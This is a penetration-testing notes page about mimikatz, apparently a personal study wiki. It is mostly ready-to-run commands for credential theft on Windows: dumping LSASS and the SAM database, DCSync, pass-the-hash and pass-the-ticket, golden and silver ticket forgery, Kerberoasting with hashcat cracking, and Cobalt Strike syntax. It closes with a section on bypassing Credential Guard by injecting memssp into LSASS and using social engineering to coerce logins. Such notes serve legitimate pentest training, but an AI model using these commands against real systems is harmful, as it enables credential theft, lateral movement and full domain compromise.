---
title: mimikatz
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - dump hashes
  - passwords
  - pass the hash attack
---
# mimikatz

**`mimikatz`** is a tool made in `C` .

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of mimikatz.

## No installation, portable

Download from: https://github.com/ParrotSec/mimikatz.git

We also have [Invoke-mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1) 

## Basic usage 


**In most internal pentests**, the most common chain is:

```
sekurlsa::logonpasswords  
↓  
extract NTLM / AES keys  
↓  
Overpass-the-Hash  
↓  
request TGT  
↓  
Pass-the-Ticket  
↓  
lateral movement (SMB / WinRM / PSExec)
```


```powershell
########################################  
# Basic privilege preparation  
########################################

# Enable debug privilege  
.\mimikatz.exe 
privilege::debug
  
# Impersonate NT AUTHORITY\SYSTEM (if allowed)  
.\mimikatz.exe 
token::elevate

  
########################################  
# Dump credentials from local security databases  
########################################  
  
# Dump local SAM database  
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"  


  
# Dump LSA secrets  
.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"


  
########################################  
# Dump credentials from LSASS memory  
########################################  
  
# Dump credentials from LSASS  
.\mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"  
  
# List kerberos tickets in memory  
.\mimikatz.exe "sekurlsa::tickets" "exit"  
  
# Dump kerberos AES keys  
.\mimikatz.exe "sekurlsa::ekeys" "exit"  
  
# Dump Terminal Services credentials  
.\mimikatz.exe "sekurlsa::tspkg" "exit"  
  
# Dump DPAPI masterkeys  
.\mimikatz.exe "sekurlsa::dpapi" "exit"


########################################  
# Domain credential attacks  
########################################  
  
# Inject into LSASS and dump domain credentials  
.\mimikatz.exe "token::elevate" "lsadump::lsa /inject" "exit"  
  
# Perform DCSync attack to dump domain credentials remotely  
.\mimikatz.exe "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:oscp.exam /all" "exit"

########################################  
# Pass-the-Hash attack  
########################################  
  
# Create a process using NTLM hash  
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>" "exit"  

# Example  
.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"


# Use NTLM hash to request a Kerberos TGT (Overpass-the-Hash)
.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /rc4:<NTLM_HASH>" "exit"
  
# Example  
.\mimikatz.exe "token::elevate" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"

# Use AES key instead of NTLM
.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /aes256:<AES_KEY>" "exit"

# Example  
.\mimikatz.exe "token::elevate" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"
  
########################################  
# Pass-the-Ticket (Kerberos ticket reuse)
########################################  
  
# List kerberos tickets currently loadedand dump them  
.\mimikatz.exe "token::elevate"  "kerberos::list /dump" "exit"  
.\mimikatz.exe "token::elevate" "kerberos::list /export" "exit"
  
# Inject a kerberos ticket into the currenct session
.\mimikatz.exe "kerberos::ptt <TGT_ticket.kirbi>" "exit"
.\mimikatz.exe "kerberos::ptt <TGS_ticket.kirbi>" "exit"


  
########################################  
# DCSync (replicate AD password database)  
########################################  
  
# Replicate domain credential data from domain controller  
.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"

# Example  
.\mimikatz.exe "token::elevate" "lsadump::dcsync /domain:oscp.exam /all" "exit"


  
########################################  
# Golden Ticket (forge Kerberos TGT)  
########################################  
  
# Forge a kerberos TGT using krbtgt hash  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"  

# Example  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
  
  
########################################  
# Silver Ticket (forge service ticket)  
########################################  
  
# Forge a service ticket for a specific service  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /target:<server> /service:cifs /rc4:<SERVICE_HASH> /ptt" "exit"

# Example  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /target:fileserver.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt" "exit"

########################################  
# Remote session enumeration  
########################################  
  
# List RDP/TS sessions  
.\mimikatz.exe  "token::elevate"  "ts::sessions" "exit"  
  
# List credential vault entries  
.\mimikatz.exe  "token::elevate" "vault::list" "exit"  
  
  
########################################  
# Work with LSASS dump files  
########################################  
  
# Dump LSASS memory to file  
.\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "exit"  
  
# Load LSASS dump for analysis  
.\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"  
  
  
########################################  
# Export kerberos tickets for Pass-The-Ticket  
########################################  
  
# Export kerberos tickets  
sekurlsa::tickets /export  
  
# Inject exported ticket into current session  
kerberos::ptt {ticketname}  

# Example  
kerberos::ptt administrator@krbtgt-HTB.LOCAL.kirbi
  
# Access remote machine using injected ticket  
dir \\machine2\c$  

# Example  
dir \\dc01.corp.local\c$
  
# Execute command remotely using injected ticket  
psexec \\machine2 cmd.exe  
  
  
########################################  
# Kerberoasting (requesting service tickets)  
########################################  
  
# Enumerate SPNs  
setspn.exe -Q */*  

# Example  
setspn.exe -Q MSSQLSvc/*
  
# Request a Kerberos TGS ticket for a service  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"  
  
# Request tickets for all SPNs  
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
  
  
########################################  
# Extract kerberos tickets for offline cracking  
########################################  
  
# Launch mimikatz  
.\mimikatz.exe  
  
# Enable base64 output  
base64 /out:true  
  
# Export kerberos tickets  
kerberos::list /export  
  
# Remove line breaks from base64 blob  
echo "<base64 blob>" | tr -d \\n  
  
# Decode base64 ticket into .kirbi file  
cat encoded_file | base64 -d > ticket.kirbi  
  
  
########################################  
# Convert kerberos ticket to crackable hash  
########################################  
  
# Convert kirbi ticket to john format  
python2.7 kirbi2john.py ticket.kirbi  
  
# Example  
python2.7 kirbi2john.py sqldev.kirbi  
  
# Convert john output to hashcat format  
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hash  
  
# Crack kerberos ticket  
hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt  
  
# Example  
hashcat -m 13100 sqldev_hash /usr/share/wordlists/rockyou.txt
  
########################################  
# Cobalt Strike mimikatz command format  
########################################  
  
# Dump LSASS credentials  
mimikatz privilege::debug  
mimikatz token::elevate  
mimikatz sekurlsa::logonpasswords  
  
# Pass-the-hash  
mimikatz privilege::debug  
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>  
  
# List kerberos tickets  
mimikatz sekurlsa::tickets  
  
# Dump Terminal Services credentials  
mimikatz sekurlsa::tspkg  
  
# Dump LSASS to file  
mimikatz sekurlsa::minidump c:\temp\lsass.dmp  
  
# Dump DPAPI masterkeys  
mimikatz sekurlsa::dpapi  
  
# Dump kerberos AES keys  
mimikatz sekurlsa::ekeys  
  
# Dump SAM database  
mimikatz lsadump::sam  
  
# Dump LSA secrets  
mimikatz lsadump::secrets  
  
# Dump domain credentials from LSASS  
mimikatz privilege::debug  
mimikatz token::elevate  
mimikatz lsadump::lsa /inject  
  
# Perform DCSync  
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all  
  
# List kerberos tickets  
mimikatz kerberos::list /dump  
  
# Inject kerberos ticket  
mimikatz kerberos::ptt <PathToKirbiFile>  
  
# List RDP sessions  
mimikatz ts::sessions  
  
# List vault credentials  
mimikatz vault::list

```


## An Example

**1.** Enumerating SPNs with setspn.exe

```cmd-session
setspn.exe -Q */*
```

We will focus on `user accounts` and ignore the computer accounts returned by the tool.

**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.

```powershell
Add-Type -AssemblyName System.IdentityModel
# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
#  New-Object cmdlet to create an instance of a .NET Framework object.
# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
```


**3.** If needed, we could also retrieve all tickets:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```


**6.** We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**7.** Use [kirbi2john.py](kirbi2john.md):


```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

**8.** Cracking the Hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.


## Evading Windows Credential Guard

### What is Windows Credential Guard and how it protects password dumping

Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the **lsass.exe** process. Fortunately, _Mimikatz_ can locate these stored credentials for us.  Because of this Microsoft has introduced several mitigations to attempt to combat this.

When Windows Credential Guard is enabled (check with Get-ComputerInfo), the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named  LSAISO.exe (LSA Isolated) and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.

>[_Virtualization-based Security (VBS)_](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) is a software technology which creates and isolates secure regions of memory which become the _root of trust_ of the operating system. VBS runs a [_hypervisor_](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through [_Hyper-V_](https://en.wikipedia.org/wiki/Hyper-V), Microsoft's native hypervisor. In addition, Microsoft built the [_Virtual Secure Mode_](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM) which is a set of hypervisor capabilities offered to the Hyper-V partitions. VSM maintains this isolation through what is known as [_Virtual Trust Levels_](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf) (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:
>
>- _VTL0_ (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (_nt_) and kernel-mode data.
>- _VTL1_ (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.
>
>The user-mode in VTL1 is known as [_Isolated User-Mode (IUM)_](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes), which consists of IUM processes known as _Trusted Processes_, _Secure Processes_, or _Trustlets_.
>
>Microsoft has used VSM as a base for several mitigations including _Device Guard_, _virtual TPMs_ and _Credential Guard_.

In this Module, we'll focus on [_Credential Guard_](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works) mitigation. When enabled, the _Local Security Authority (LSASS)_ environment runs as a trustlet in VTL1 named _LSAISO.exe (LSA Isolated)_ and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.

Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it.


### The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)

Given that we can't retrieve cached hashes and credentials, we must change our focus. Instead of trying to get this information after a user has already logged into the box, we could attempt to intercept the credentials while a user is logging in.

Microsoft provides quite a few [_authentication mechanisms_](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024\(v=ws.10\)) as part of the Windows operating system such as _Local Security Authority (LSA) Authentication_, _Winlogon_, _Security Support Provider Interfaces (SSPI)_, etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. By default, Windows provides several _Security Support Providers (SSP)_ such as _Kerberos Security Support Provider_, _NTLM Security Support Provider_, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

Additionally the SSP can also be registered through the _HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages_ registry key. Each time the system starts up, the _Local Security Authority_ (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with _LSASS_, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

Fortunately, Mimikatz already supports this through the [_memssp_](https://tools.thehacker.recipes/mimikatz/modules/misc/memssp), which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the **lsass.exe** process without dropping any DLLs on disk.

The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing us to intercept them directly without needing to resort to a hash.

### Bypassing Windows Credential Guard 

```bash
mimikatz.exe
privilege::debug
misc::memssp

.\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
```

When injecting a SSP into _LSASS_ using Mimikatz, the credentials will be saved in a log file, **C:\Windows\System32\mimilsa.log**.

```bash
type C:\Windows\System32\mimilsa.log
```

At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.